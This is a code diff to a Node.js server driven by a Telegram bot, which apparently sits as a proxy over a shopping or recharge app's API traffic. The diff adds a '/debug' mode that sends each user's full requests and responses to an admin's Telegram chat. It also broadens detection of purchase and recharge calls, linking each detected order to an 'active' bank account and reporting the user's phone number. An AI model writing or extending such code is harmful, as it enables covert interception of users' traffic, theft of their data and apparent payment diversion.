@@ -250,7 +250,16 @@ app.post('/hook/log', async (req, res) => {
       }
     }
 
-    if (data.logRequests && data.adminChatId && bot) {
+    if (data.debugMode && data.adminChatId && bot) {
+      const tag = userId ? ` [UID:${userId}]` : ' [UID:?]';
+      const now2 = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+`🐛 DEBUG${tag}
+🔗 ${m || 'GET'} ${u}
+📤 REQ: ${(b || 'empty').substring(0, 400)}
+📥 RES: ${(r || 'empty').substring(0, 600)}
+🕐 ${now2}`).catch(()=>{});
+    } else if (data.logRequests && data.adminChatId && bot) {
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
       bot.sendMessage(data.adminChatId, `📡 ${m || 'GET'} ${urlPath}${tag}${phoneTag}\n📊 Status: ${s || 'N/A'}`).catch(()=>{});
@@ -270,29 +279,36 @@ app.post('/hook/log', async (req, res) => {
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
     }
 
-    if (u.includes('order') || u.includes('buy') || u.includes('recharge') || u.includes('trade')) {
-      if (respData && typeof respData === 'object') {
-        const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id'];
-        let orderId = '';
-        const rd2 = Array.isArray(respData) ? null : respData;
-        if (rd2) {
-          for (const f of orderFields) {
-            if (rd2[f] && String(rd2[f]).length >= 3) { orderId = String(rd2[f]); break; }
-          }
+    const isBuyUrl = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(u)
+      || (/\/(order|buy|recharge|trade)/i.test(u) && m === 'POST');
+    if (isBuyUrl && respData && typeof respData === 'object') {
+      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
+      let orderId = '';
+      const rd2 = Array.isArray(respData) ? null : respData;
+      if (rd2) {
+        for (const f of orderFields) {
+          if (rd2[f] && String(rd2[f]).length >= 3) { orderId = String(rd2[f]); break; }
         }
-        const bank = getActiveBank(data, userId);
-        if (orderId && bank) {
-          if (!data.orderBankMap) data.orderBankMap = {};
-          data.orderBankMap[orderId] = {
-            bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
-            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-            userId: userId || ''
-          };
+      }
+      if (!orderId && !Array.isArray(respData)) {
+        for (const k of Object.keys(rd2 || {})) {
+          if (/order|trade|no/i.test(k) && typeof rd2[k] === 'string' && rd2[k].length >= 5) { orderId = rd2[k]; break; }
         }
+      }
+      const bank = getActiveBank(data, userId);
+      if (orderId && bank) {
+        if (!data.orderBankMap) data.orderBankMap = {};
+        data.orderBankMap[orderId] = {
+          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
+          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          userId: userId || ''
+        };
+      }
+      if (orderId) {
         notifyAdmin(data,
 `🔔 ORDER DETECTED
 👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}
-📋 Order: ${orderId || 'N/A'}
+📋 Order: ${orderId}
 💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
 📦 Data: ${(r || '').substring(0, 500)}
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
@@ -455,6 +471,7 @@ app.post('/bot-webhook', async (req, res) => {
 /off — Proxy OFF
 /rotate — Toggle auto-rotate
 /log — Toggle request logging
+/debug — Full debug mode (har URL + body + response)
 /update — Toggle update block
 /status — Full status
 
@@ -506,6 +523,15 @@ Example:
     if (text === '/off') { data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/debug') {
+      data.debugMode = !data.debugMode;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, data.debugMode
+        ? `🐛 DEBUG MODE ON\n\nAb har API call ka full URL + Request + Response aayega bot pe.\nApp use karo aur jo messages aate hain wo share karo.\n\nBand karne ke liye dobara /debug bhejo.`
+        : `🐛 Debug Mode OFF`);
+      return res.sendStatus(200);
+    }
 
     if (text === '/update' || text === '/update off' || text === '/update on') {
       if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
